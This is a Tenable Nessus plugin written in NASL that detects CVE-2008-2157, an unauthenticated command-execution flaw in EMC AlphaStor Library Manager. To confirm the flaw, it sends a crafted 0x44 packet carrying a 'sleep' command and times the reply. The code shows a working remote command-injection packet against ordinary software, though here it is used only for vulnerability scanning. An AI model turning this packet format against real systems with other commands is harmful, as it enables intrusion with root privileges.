#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(33285);
  script_version("$Revision: 1.17 $");
  script_cve_id("CVE-2008-2157");
  script_bugtraq_id(29398);
  script_osvdb_id(45715);

  script_name(english:"EMC AlphaStor Library Manager Remote Code Execution");
  script_summary(english:"Checks AlpahStor Library Manager robotd command execution");

 script_set_attribute(attribute:"synopsis", value:
"It is possible to execute code on the remote tape backup manager." );
 script_set_attribute(attribute:"description", value:
"The installed instance of AlphaStor Library Manager is vulnerable to a 
command execution flaw when it receives a packet with a 0x44 code.
Packet string argument is used unsanitized as a call to the 'system'
function.

An unauthenticated, remote attacker may be able to exploit this flaw to
execute code on the remote host with SYSTEM/root privileges." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?666077ae" );
 script_set_attribute(attribute:"solution", value:
"Fix is available in knowledgebase article emc186391." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
 script_set_attribute(attribute:"canvas_package", value:'D2ExploitPack');
 script_cwe_id(20);
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/07/01");
 script_cvs_date("$Date: 2015/01/14 15:38:17 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"Gain a shell remotely");
  script_copyright(english:"This script is Copyright (C) 2008-2015 Tenable Network Security, Inc.");
  script_dependencies("alphastor_libmanager_detect.nasl");
  script_require_ports("Services/alphastor-libmanager", 3500);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("byte_func.inc");


function mk_command(cmd, s)
{
 local_var len;

 len = strlen(s);

 return mkbyte(cmd + 0x31) + s + crap(data:mkbyte(0), length:0x200-len) + mkbyte(0);
}


function test(port, sleeps)
{
 local_var d, i, req, res, sleep, soc, tictac1, tictac2;

 foreach sleep (sleeps)
 {
  soc = open_sock_tcp(port);
  if (!soc) return 0;

  req = mk_command(cmd:0x44, s:string("sleep ", sleep));
  send(socket:soc, data:req);

  tictac1 = unixtime();

  res = recv(socket:soc, length:0x202, min:0x202, timeout:15);
  close(soc);
  if (isnull(res) || strlen(res) != 0x202) 
    return 0;

  tictac2 = unixtime();
  d = tictac2 - tictac1;

  for (i=0; i<0x202; i++)
    if (ord(res[i]) != 0) exit(0);

  if ( (d < sleep) || (d >= (sleep + 5)) )
    return 0;
 }

 return 1;
}

port = get_kb_item("Services/alphastor-libmanager");
if (!port) port = 3500;
if (!get_port_state(port)) exit(0);


if (test(port: port, sleeps: make_list(1, 3, 7)))
  security_hole(port: port);
